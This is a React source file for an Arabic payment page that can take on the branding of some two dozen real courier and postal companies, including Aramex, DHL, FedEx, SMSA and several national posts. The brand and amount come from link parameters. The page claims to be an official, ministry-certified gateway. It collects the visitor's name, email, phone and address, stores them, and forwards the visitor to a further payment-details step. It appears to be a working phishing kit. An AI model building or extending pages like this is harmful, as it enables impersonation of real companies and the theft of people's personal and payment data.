import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Lock, CheckCircle } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroGenacom from "@/assets/hero-genacom.jpg";
import heroAlbaraka from "@/assets/hero-albaraka.jpg";
import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
import heroAlshaya from "@/assets/hero-alshaya.jpg";
import heroBahri from "@/assets/hero-bahri.jpg";
import heroShipco from "@/assets/hero-shipco.jpg";
import heroHellmann from "@/assets/hero-hellmann.jpg";
import heroDsv from "@/assets/hero-dsv.jpg";
import heroJinakum from "@/assets/hero-jinakum.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const currencyParam = urlParams.get('currency');
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  // Use dynamic company meta for OG tags
  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const shippingInfo = linkData?.payload as any;

  // Get payer type from shipping info (default to "recipient" for backward compatibility)
  const payerType = shippingInfo?.payer_type || "recipient";

  // Get country from link data (must be before using currency functions)
  const countryCode = shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";

  // Use currency from URL parameter if available, otherwise from country data
  const currencyCode = currencyParam || countryData?.currency || "SAR";

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCode);

  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
    'genacom': heroGenacom,
    'jinaken': heroGenacom,
    'albaraka': heroAlbaraka,
    'alfuttaim': heroAlfuttaim,
    'alshaya': heroAlshaya,
    'bahri': heroBahri,
    'national': heroBahri,
    'shipco': heroShipco,
    'hellmann': heroHellmann,
    'dsv': heroDsv,
    'jinakum': heroJinakum,
  };

  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          residential_address: residentialAddress,
          payer_type: payerType,
        },
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      navigate(`/pay/${id}/details?service=${serviceKey}&currency=${currencyCode}&title=${encodeURIComponent(dynamicTitle)}`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={dynamicTitle}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
        image={dynamicImage}
      />

      <div className="min-h-screen" style={{ backgroundColor: 'var(--theme-lightGray)' }} dir="rtl">
        {/* Header */}
        <div className="w-full" style={{ backgroundColor: 'var(--theme-primary)' }}>
          <div className="container mx-auto px-4 py-3">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 bg-white rounded-lg flex items-center justify-center">
                  <Shield className="w-6 h-6" style={{ color: 'var(--theme-primary)' }} />
                </div>
                <div className="text-white">
                  <h1 className="text-lg font-bold">البوابة الرسمية للدفع</h1>
                  <p className="text-xs opacity-90">آمن • موثوق • سريع</p>
                </div>
              </div>
              <Badge variant="secondary" className="bg-white text-gray-800">
                <Lock className="w-3 h-3 ml-1" />
                اتصال آمن
              </Badge>
            </div>
          </div>
        </div>

        {/* Hero Section */}
        <div className="relative w-full h-64 overflow-hidden">
          <img
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-black/40" />
          <div className="absolute bottom-6 right-6 text-white max-w-2xl">
            <div className="text-right">
              <h2 className="text-2xl font-bold mb-2">{payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}</h2>
              <p className="text-sm opacity-90 mb-1">{serviceName}</p>
              <p className="text-lg font-semibold">{formattedAmount}</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-4 py-8">
          <div className="max-w-4xl mx-auto">
            {/* Security Notice */}
            <div className="mb-6 p-4 bg-white rounded-lg border-r-4" style={{ borderRightColor: 'var(--theme-secondary)' }}>
              <div className="flex items-start gap-3">
                <CheckCircle className="w-5 h-5 mt-0.5" style={{ color: 'var(--theme-secondary)' }} />
                <div>
                  <h3 className="font-semibold text-sm mb-1">بياناتك محمية</h3>
                  <p className="text-xs text-gray-600">
                    نحن نستخدم أعلى معايير الأمان لحماية معلوماتك الشخصية والمالية
                  </p>
                </div>
              </div>
            </div>

            <Card className="p-6 sm:p-8 shadow-lg border-0 rounded-lg overflow-hidden">
              <div className="mb-6">
                <div className="flex items-center gap-3 mb-2">
                  <div
                    className="w-12 h-12 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: `var(--theme-primary)15` }}
                  >
                    <User className="w-6 h-6" style={{ color: 'var(--theme-primary)' }} />
                  </div>
                  <div>
                    <h3 className="text-lg font-bold" style={{ color: 'var(--theme-accent)' }}>
                      {payerType === "recipient" ? "بيانات المستلم" : "بيانات المرسل"}
                    </h3>
                    <p className="text-sm text-gray-500">الرجاء إدخال جميع البيانات المطلوبة</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleProceed} className="space-y-5">
                {/* Customer Name */}
                <div>
                  <Label htmlFor="name" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: 'var(--theme-accent)' }}>
                    <User className="w-4 h-4" />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>

                {/* Customer Email */}
                <div>
                  <Label htmlFor="email" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: 'var(--theme-accent)' }}>
                    <Mail className="w-4 h-4" />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="example@email.com"
                  />
                </div>

                {/* Customer Phone */}
                <div>
                  <Label htmlFor="phone" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: 'var(--theme-accent)' }}>
                    <Phone className="w-4 h-4" />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                  />
                </div>

                {/* Residential Address */}
                <div>
                  <Label htmlFor="address" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: 'var(--theme-accent)' }}>
                    <MapPin className="w-4 h-4" />
                    العنوان *
                  </Label>
                  <Input
                    id="address"
                    value={residentialAddress}
                    onChange={(e) => setResidentialAddress(e.target.value)}
                    required
                    className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
                    placeholder="أدخل عنوانك الكامل"
                  />
                </div>

                {/* Payment Summary */}
                <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: 'var(--theme-lightGray)' }}>
                  <h4 className="font-semibold mb-3" style={{ color: 'var(--theme-accent)' }}>ملخص المبلغ</h4>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-gray-600">المبلغ الإجمالي</span>
                    <span className="text-xl font-bold" style={{ color: 'var(--theme-primary)' }}>{formattedAmount}</span>
                  </div>
                </div>

                {/* Proceed Button */}
                <Button
                  type="submit"
                  size="lg"
                  className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
                  style={{ backgroundColor: 'var(--theme-primary)' }}
                  disabled={!customerName || !customerEmail || !customerPhone || !residentialAddress}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-5 h-5" />
                </Button>

                <p className="text-xs text-center text-gray-500 mt-4">
                  بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
                </p>
              </form>
            </Card>

            {/* Security Footer */}
            <div className="mt-6 text-center">
              <div className="inline-flex items-center gap-2 px-4 py-2 bg-white rounded-full shadow-sm">
                <Shield className="w-4 h-4" style={{ color: 'var(--theme-secondary)' }} />
                <span className="text-xs font-medium" style={{ color: 'var(--theme-accent)' }}>معتمد من وزارة التجارة</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
